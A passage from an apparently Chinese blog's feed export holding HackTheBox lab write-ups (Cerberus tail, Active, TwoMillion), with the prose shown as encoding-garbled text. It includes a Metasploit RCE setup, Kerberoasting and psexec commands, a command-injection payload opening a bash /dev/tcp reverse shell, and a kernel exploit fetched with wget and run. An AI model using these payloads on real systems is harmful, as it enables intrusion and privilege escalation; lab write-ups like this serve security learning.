<p>é¶æœºè¿è¡Œå®Œä¸Šè¿°å‘½ä»¤åï¼Œæœ¬åœ°kaliå¯çœ‹åˆ°å¦‚ä¸‹ç•Œé¢ï¼Œè¡¨ç¤ºsocksä»£ç†å·²å»ºç«‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724142703206.png"></p>
<p>ç›®å‰ä¸ºæ­¢ï¼Œå»ºç«‹äº†ä¸¤æ¡ä»£ç†è·¯çº¿</p>
<table>
<thead>
<tr>
<th>10.10.14.8ï¼ˆæœ¬åœ°kaliï¼‰</th>
<th>172.16.22.1ï¼ˆåŸŸæ§ä¸»æœºï¼‰</th>
</tr>
</thead>
<tbody><tr>
<td>9899ç«¯å£</td>
<td>5985ç«¯å£ï¼ˆWinrmæœåŠ¡ï¼‰</td>
</tr>
<tr>
<td>9900ç«¯å£</td>
<td>1080ï¼ˆsocksä»£ç†ï¼Œä¸ºäº†è¿æ¥9251ç«¯å£æœåŠ¡ï¼‰</td>
</tr>
</tbody></table>
<p>åœ¨æœ¬åœ°hostsæ–‡ä»¶æ·»åŠ å¦‚ä¸‹æ¡ç›®ï¼Œå¹¶æŠŠæœ€å¼€å§‹æ·»åŠ çš„é‚£æ¡10.10.11.205çš„è®°å½•ç»™æ³¨é‡Šæ‰</p>
<pre class="line-numbers language-none"><code class="language-none">127.0.0.1    cerberus.local icinga.cerberus.local dc.cerberus.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨çš„ä»£ç†æ’ä»¶ä¿®æ”¹ä»£ç†å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724150245088.png"></p>
<p>ç„¶åæµè§ˆå™¨è®¿é—®ï¼š<a href="https://dc.cerberus.local:9251ï¼Œå¾—åˆ°å¦‚ä¸‹ç•Œé¢">https://dc.cerberus.local:9251ï¼Œå¾—åˆ°å¦‚ä¸‹ç•Œé¢</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724150359490.png" style="zoom: 80%;">

<p>ç”¨ä¹‹å‰è·å¾—çš„è´¦å·å¯†ç ç™»å½•</p>
<pre class="line-numbers language-none"><code class="language-none">matthew@cerberus.local
147258369<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç™»å½•æˆåŠŸæ˜¯å¦‚ä¸‹ç•Œé¢ï¼Œåœ¨URLå¯çœ‹åˆ°guidï¼Œåœ¨F12æ§åˆ¶å°å¯çœ‹åˆ°è¯·æ±‚å¤´æœ‰ä¸€ä¸²ç¼–ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724151812205.png"></p>
<p>base64è§£ç ã€æ ¼å¼åŒ–ä¹‹åï¼Œå¾—åˆ°å¦‚ä¸‹ä»£ç ï¼Œçœ‹åˆ°Issuer</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724152457878.png"></p>
<p>å¯åŠ¨MSFï¼Œæœç´¢ADSelfServiceçš„exploit</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole
search ADSelfService<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724155304824.png"></p>
<p>é€‰ä¸­exploitå¹¶è®¾ç½®å‚æ•°ï¼ˆæ³¨æ„è®¾ç½®socksä»£ç†ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
set RHOSTS 172.16.22.1
set LHOST 10.10.14.8

set AutoCheck false
set ReverseAllowProxy true
set Proxies socks5:127.0.0.1:1080
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿è¡Œexploitï¼ŒæˆåŠŸè·å–systemæƒé™</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230727083842830.png" style="zoom:80%;">

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://hackmd.io/@b3n5/rJRSRUGBn">https://hackmd.io/@b3n5/rJRSRUGBn</a></p>
<p><a href="https://blog.csdn.net/qq_58869808/article/details/129786875">https://blog.csdn.net/qq_58869808/article/details/129786875</a></p>
<p><a href="https://www.ngui.cc/article/show-1006958.html?action=onClick">https://www.ngui.cc/article/show-1006958.html?action=onClick</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>icingaæœåŠ¡</tag>
        <tag>CVE-2022-24716ï¼ˆç›®å½•éå†ï¼‰</tag>
        <tag>CVE-2022-24715ï¼ˆRCEï¼‰</tag>
        <tag>CVE-2022-31214ï¼ˆFirejailæœ¬åœ°ææƒï¼‰</tag>
        <tag>winrm</tag>
        <tag>chiselä»£ç†</tag>
        <tag>MSFææƒ</tag>
        <tag>ManageEngine ADSelfService PlusæœåŠ¡</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Active</title>
    <url>/posts/79fbfa03.html</url>
    <content><![CDATA[<h1 id="HTB-Active"><a href="#HTB-Active" class="headerlink" title="HTB-Active"></a>HTB-Active</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>ä¸»è¦å·¥å…·ï¼š</p>
<p>smbmapï¼šæŸ¥çœ‹SMBå…±äº«æœåŠ¡ä¿¡æ¯</p>
<p>smbclientï¼šè¿æ¥SMBæœåŠ¡</p>
<p>gpp-decryptï¼šè§£å¯†ä¸»æœºå¯†ç </p>
<p>impacket-GetUserSPNsï¼šè·å–SPNä¿¡æ¯</p>
<p>impacket-psexecï¼šç™»å½•ä¸»æœºï¼Œè·å–shell</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«ç«¯å£æœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -p- --min-rate 10000 -Pn -sT 10.10.10.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802110837445.png"></p>
<pre class="line-numbers language-none"><code class="language-none">nmap -A 10.10.10.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802140113949.png"></p>
<p>ç”¨smbmapæŸ¥çœ‹SMBå…±äº«æœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">smbmap -H 10.10.10.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802140644696.png"></p>
<p>SMBå…±äº«å‡ºæ¥çš„Replicationç›®å½•æœ‰åªè¯»æƒé™ï¼Œç”¨smbclientåŒ¿åè¿æ¥ä¸€ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">smbclient //10.10.10.100/Replication -N<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802140709205.png"></p>
<p>åœ¨å¦‚ä¸‹ç›®å½•ï¼Œæ‰¾åˆ°Groups.xmlæ–‡ä»¶ï¼Œæ²¡æ³•ç›´æ¥è¯»ï¼Œå°è¯•æŠŠå®ƒä¸‹è½½åˆ°æœ¬åœ°kaliï¼ˆGroups.xmlä½œç”¨å¯ä»¥ç†è§£ä¸ºåŸŸå†…ä¸»æœºçš„é…ç½®æ–‡ä»¶ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802140927879.png"></p>
<p>smbè¿æ¥çª—å£æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">get Groups.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°kaliæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">cat Groups.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802144025973.png"></p>
<p>çœ‹åˆ°ä¸»æœºç”¨æˆ·å’Œå¯†ç ï¼Œç”¨gpp-decryptè§£å¯†</p>
<pre class="line-numbers language-none"><code class="language-none">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802144435689.png"></p>
<pre class="line-numbers language-none"><code class="language-none">GPPstillStandingStrong2k18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å°è¯•ä»¥adminç”¨æˆ·è¿æ¥smbæœåŠ¡ï¼Œå¤±è´¥</p>
<pre class="line-numbers language-none"><code class="language-none">smbclient -W 10.10.10.100 -U SVC_TGS //10.10.10.100/ADMIN$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802145514833.png"></p>
<p>ä»¥æ™®é€šç”¨æˆ·è¿æ¥smbæœåŠ¡ï¼ŒæˆåŠŸ</p>
<pre class="line-numbers language-none"><code class="language-none">smbclient -W 10.10.10.100 -U SVC_TGS //10.10.10.100/USERS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802145547014.png"></p>
<p>è¯»user.txt</p>
<pre class="line-numbers language-none"><code class="language-none">cd SVC_TGS\Desktop\
get user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><p>ç”¨å¦‚ä¸‹å‘½ä»¤è·å–SPNæˆåŠŸ</p>
<pre class="line-numbers language-none"><code class="language-none">impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802151639024.png"></p>
<p>æ•°æ®æ˜¯johnå¯ä»¥çˆ†ç ´çš„æ ¼å¼ï¼Œç›´æ¥johnçˆ†ç ´ï¼Œå¾—Administratorå¯†ç </p>
<pre class="line-numbers language-none"><code class="language-none">john --wordlist=/usr/share/wordlists/rockyou.txt SPN.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802151922988.png"></p>
<p>ç”¨Administratorè´¦æˆ·ç™»å½•ä¸»æœºï¼ŒæˆåŠŸè·å–systemæƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802152149422.png"></p>
<p>è¯»root.txtï¼ŒOverï¼</p>
<pre class="line-numbers language-none"><code class="language-none">type C:\Users\Administrator\Desktop\root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802152447938.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/active-writeup-w-o-metasploit">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/active-writeup-w-o-metasploit</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>impacket</tag>
        <tag>windows</tag>
        <tag>SMBæœåŠ¡</tag>
        <tag>SPNä¿¡æ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-TwoMillion</title>
    <url>/posts/feb24f25.html</url>
    <content><![CDATA[<h1 id="HTB-TwoMillion"><a href="#HTB-TwoMillion" class="headerlink" title="HTB-TwoMillion"></a>HTB-TwoMillion</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ä¸»ç«™é‚€è¯·ç æ³¨å†ŒåŠŸèƒ½é¡µé¢jsæ–‡ä»¶å‘ç°å¯ç”¨APIï¼›</p>
<p>2.é€šè¿‡APIè·å¾—é‚€è¯·ç æ³¨å†Œç”¨æˆ·å¹¶ç™»å½•ï¼›</p>
<p>3.å‘ç°adminè®¤è¯çš„APIæ³„éœ²ï¼›</p>
<p>4.é€šè¿‡APIå®ç°è¶Šæƒï¼Œå¹¶ä¸”å‘ç°å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼›</p>
<p>5.å‘½ä»¤æ‰§è¡Œåå¼¹shellè·å–www-dataæƒé™ï¼›</p>
<p>6.é‚®ä»¶ä¿¡æ¯æ³„éœ²ï¼Œç”¨CVE-2023-0386ï¼ˆOverlayFSææƒï¼‰è·å–rootæƒé™ã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828100355909.png"></p>
<p>ç«¯å£å¾ˆç®€å•ï¼Œä½†å¾—åˆ°ä¸€ä¸ªåŸŸåï¼ŒåŸŸåå†™å…¥æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.221 2million.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨è®¿é—®</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828101902128.png"></p>
<p>ä¸‹æ»‘ï¼Œæœ‰ä¸ªå¦‚ä¸‹joinçš„ç•Œé¢</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828101928607.png" style="zoom: 80%;">

<p>ç‚¹å‡»<code>Join HTB</code>ï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼Œéœ€è¦è¾“å…¥é‚€è¯·ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828102944481.png"></p>
<p>æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°éªŒè¯ç æ­£ç¡®åä¼šè·³è½¬åˆ°<code>/register</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828103644181.png"></p>
<p>ç›´æ¥è®¿é—®<code>/register</code>ï¼Œè®¿é—®æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰é‚€è¯·ç è¿˜æ˜¯æ— æ³•æ³¨å†Œ</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828103710738.png" style="zoom:80%;">

<p>åˆšåˆšé‚€è¯·ç é¡µé¢çš„æºç æœ‰ä¸ª<code>/js/inviteapi.min.js</code>æ–‡ä»¶ï¼Œç”¨<a href="https://beautifier.io/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%BE%97%E5%88%B0%E5%A6%82%E4%B8%8B%E4%BB%A3%E7%A0%81">https://beautifier.io/æ ¼å¼åŒ–å¾—åˆ°å¦‚ä¸‹ä»£ç </a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828104417503.png"></p>
<p>æœ‰ä¸¤ä¸ªAPIï¼Œcurlè®¿é—®<code>2million.htb/api/v1/invite/how/to/generate</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828104757966.png"></p>
<p>æœ‰ä¸€æ®µdataæ˜¯ROT13ç¼–ç ï¼Œè½¬æ¢å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr
ROT13è½¬æ¢åï¼š
In order to generate the invite code, make a POST request to /api/v1/invite/generate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>åˆå¾—åˆ°ä¸€ä¸ªAPIï¼Œçœ‹APIåå­—åƒæ˜¯ç”Ÿæˆé‚€è¯·ç ï¼Œcurlè®¿é—®<code>2million.htb/api/v1/invite/generate</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828105141164.png"></p>
<p>æœ‰ä¸€æ®µåƒbase64çš„ç¼–ç ï¼Œè§£ç å¦‚ä¸‹ï¼Œå¾—åˆ°é‚€è¯·ç </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# echo "MVRJVE0tUkxGVFktVzFDT1AtQ0RCOVQ=" | base64 -d  
1TITM-RLFTY-W1COP-CDB9T<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>è¿”å›è¾“å…¥é‚€è¯·ç çš„ç•Œé¢<code>/invite</code>ï¼Œè¾“å…¥é‚€è¯·ç åæ³¨å†Œç”¨æˆ·</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828105704156.png" style="zoom:80%;">

<p>æ³¨å†ŒæˆåŠŸåä¼šè·³è½¬åˆ°ç™»å½•é¡µé¢ï¼Œç™»å½•è¿›å…¥å¦‚ä¸‹ç•Œé¢</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828110037440.png" style="zoom: 67%;">

<p>åœ¨å·¦ä¾§<code>Labs</code>â†’<code>Access</code>ç•Œé¢ï¼Œå¦‚ä¸‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828110628271.png" style="zoom: 67%;">

<p>å®¡æŸ¥å…ƒç´ ï¼Œçœ‹åˆ°æœ‰API</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828110738917.png"></p>
<p>æµè§ˆå™¨è®¿é—®<code>/api</code>ç›®å½•ï¼Œçœ‹æœ‰æ²¡æœ‰APIæ³„éœ²ï¼Œçœ‹åˆ°<code>/api/v1</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828110821701.png"></p>
<p>å†è®¿é—®<code>/api/v1</code>ï¼Œæ³„éœ²äº†API</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828110855905.png"></p>
<h2 id="ä¸‰ã€APIè¶Šæƒ"><a href="#ä¸‰ã€APIè¶Šæƒ" class="headerlink" title="ä¸‰ã€APIè¶Šæƒ"></a>ä¸‰ã€APIè¶Šæƒ</h2><p>userçš„å°±ä¸ç®¡äº†ï¼Œç›´æ¥å°è¯•è®¿é—®adminçš„APIï¼ŒGETè®¿é—®<code>/api/v1/admin/auth</code>ï¼Œè¿”å›false</p>
<pre class="line-numbers language-none"><code class="language-none">GET /api/v1/admin/auth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112229587.png"></p>
<p>POSTè®¿é—®<code>/api/v1/admin/vpn/generate</code>ï¼Œè¿”å›401æœªè®¤è¯å“åº”ç </p>
<pre class="line-numbers language-none"><code class="language-none">POST /api/v1/admin/vpn/generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112148644.png"></p>
<p>PUTè®¿é—®<code>/api/v1/admin/settings/update</code>ï¼Œè¿”å›<code>Invalid content type</code></p>
<pre class="line-numbers language-none"><code class="language-none">PUT /api/v1/admin/settings/update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112312680.png"></p>
<p>é‚£å°±ä¿®æ”¹è¯·æ±‚åŒ…<code>Content-Type</code>å­—æ®µå€¼ä¸ºjsonæ ¼å¼å†æ¬¡è®¿é—®ï¼Œæç¤ºæ²¡æœ‰<code>email</code>å‚æ•°</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112436580.png"></p>
<p>åœ¨è¯·æ±‚åŒ…æ•°æ®éƒ¨åˆ†ç”¨jsonæ ¼å¼è®¾ç½®emailå‚æ•°å†æ¬¡è®¿é—®ï¼Œæç¤ºæ²¡æœ‰<code>is_admin</code>å‚æ•°</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112558648.png"></p>
<p>å†è®¾ç½®<code>is_admin</code>å‚æ•°ï¼Œåˆæç¤º<code>is_admin</code>å‚æ•°éœ€è¦æ˜¯0æˆ–1</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112706098.png"></p>
<p>è®¾ç½®<code>is_admin</code>å‚æ•°å€¼ä¸º1ï¼Œæ³¨æ„ä¸èƒ½ç”¨å¼•å·ï¼Œåˆæç¤ºemailæ²¡æ‰¾åˆ°</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112837405.png"></p>
<p>è®¾ç½®emailä¸ºåˆšæ³¨å†Œçš„eamilï¼Œè¿”å›ç”¨æˆ·æ•°æ®ï¼Œåº”è¯¥æ˜¯è®¤è¯æˆåŠŸäº†</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112906482.png"></p>
<p>å†GETè®¿é—®<code>/api/v1/admin/auth</code>ï¼Œmessageå˜ä¸ºtrue</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828113050824.png"></p>
<p>å†POSTè®¿é—®<code>/api/v1/admin/vpn/generate</code>ï¼Œä¾æ—§æ˜¯æŒ‰ç…§å“åº”åŒ…æç¤ºï¼Œä¿®æ”¹è¯·æ±‚åŒ…çš„<code>Content-Type</code>å­—æ®µå’Œæ•°æ®éƒ¨åˆ†ï¼Œå¾—åˆ°å¦‚ä¸‹å“åº”ï¼Œç”Ÿæˆäº†vpnè¿æ¥çš„å‡­æ®ï¼Œç„¶åå‘ç°è¿™ä¸ªä½ç½®æœ‰ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œusernameå­—æ®µå€¼åº”è¯¥æ˜¯ç›´æ¥è¢«æ‹¼æ¥åˆ°linuxçš„shellå‘½ä»¤ä¸­äº†ï¼Œç±»ä¼¼äº<code>generate_vpn.sh [username]</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828130831787.png"></p>
<h2 id="å››ã€å‘½ä»¤æ‰§è¡Œ"><a href="#å››ã€å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å››ã€å‘½ä»¤æ‰§è¡Œ"></a>å››ã€å‘½ä»¤æ‰§è¡Œ</h2><p>ä¿®æ”¹è¯·æ±‚ä¸­çš„usernameå­—æ®µå€¼å¦‚ä¸‹ï¼Œæ³¨æ„å‘½ä»¤å’Œæ³¨é‡Šç¬¦<code>#</code>ä¹‹é—´éœ€è¦æœ‰ä¸ªç©ºæ ¼ï¼Œæ‰§è¡Œå‘½ä»¤æˆåŠŸ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828132348031.png"></p>
<p>äºæ˜¯ç”¨å¦‚ä¸‹è¯·æ±‚æ•°æ®åå¼¹shell</p>
<pre class="line-numbers language-none"><code class="language-none">{"username":"wa0er;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1' #"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°ç›‘å¬ï¼ŒæˆåŠŸåå¼¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828140143981.png"></p>
<p>åœ¨å½“å‰ç›®å½•çš„ç¯å¢ƒå˜é‡æ–‡ä»¶<code>.env</code>æ‰¾åˆ°adminç”¨æˆ·å¯†ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828141213435.png"></p>
<pre class="line-numbers language-none"><code class="language-none">DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>å°è¯•å‘ç°ï¼Œæ—¢å¯shellç™»å½•ï¼Œä¹Ÿå¯sshç™»å½•</p>
<p>shellç™»å½•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828141659786.png"></p>
<p>sshç™»å½•</p>
<pre class="line-numbers language-none"><code class="language-none">ssh admin@10.10.11.221<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828142519715.png"></p>
<p>sshç™»å½•å‘ç°æœ‰ä¸ªæç¤º<code>You have mail</code>ï¼Œç”¨<code>find / -name 'mail' 2&gt;/dev/null</code>æŸ¥æ‰¾åå­—ä¸º<code>mail</code>çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œç„¶ååœ¨<code>/var/mail/admin</code>æ–‡ä»¶ä¸­æ‰¾åˆ°ä¸€å°é‚®ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828143317099.png"></p>
<p>æç¤ºæœ‰Linuxå†…æ ¸çš„CVEï¼Œå…³é”®è¯OverlayFS / FUSE</p>
<h2 id="äº”ã€CVE-2023-0386ï¼ˆOverlayFSææƒï¼‰"><a href="#äº”ã€CVE-2023-0386ï¼ˆOverlayFSææƒï¼‰" class="headerlink" title="äº”ã€CVE-2023-0386ï¼ˆOverlayFSææƒï¼‰"></a>äº”ã€CVE-2023-0386ï¼ˆOverlayFSææƒï¼‰</h2><p>googleæœç´¢å…³é”®å­—ï¼šOverlayFS / FUSE exploit</p>
<p>æ¼æ´åˆ†æï¼š<a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/</a></p>
<p>exploitï¼š<a href="https://github.com/xkaneiki/CVE-2023-0386/">https://github.com/xkaneiki/CVE-2023-0386/</a></p>
<p>æœ¬åœ°ä¸‹è½½exploitï¼Œç„¶åç”¨wgetä¼ åˆ°ç›®æ ‡é¶æœº</p>
<p>æœ¬åœ°å¼€å¯httpæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç›®æ ‡é¶æœºä¸‹è½½ã€è§£å‹ã€ç¼–è¯‘ã€æ‰§è¡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">cd /tmp
wget http://10.10.14.7/CVE-2023-0386-main.zip
unzip CVE-2023-0386-main.zip
cd CVE-2023-0386-main
make all	#ç¼–è¯‘æœ‰æŠ¥é”™ï¼Œä¸å½±å“
./fuse ./ovlcap/lower ./gc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828145832655.png"></p>
<p>å¦å¼€ä¸€ä¸ªç»ˆç«¯è¿æ¥sshï¼Œåˆ°<code>/tmp/CVE-2023-0386-main</code>ç›®å½•ä¸‹æ‰§è¡Œ<code>./exp</code>ï¼ŒæˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828150040778.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828150233362.png" style="zoom: 80%;">]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>APIæ³„éœ²</tag>
        <tag>APIè¶Šæƒ</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>CVE-2023-0386ï¼ˆOverlayFSææƒï¼‰</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-PC</title>
    <url>/posts/cbbc48d2.html</url>
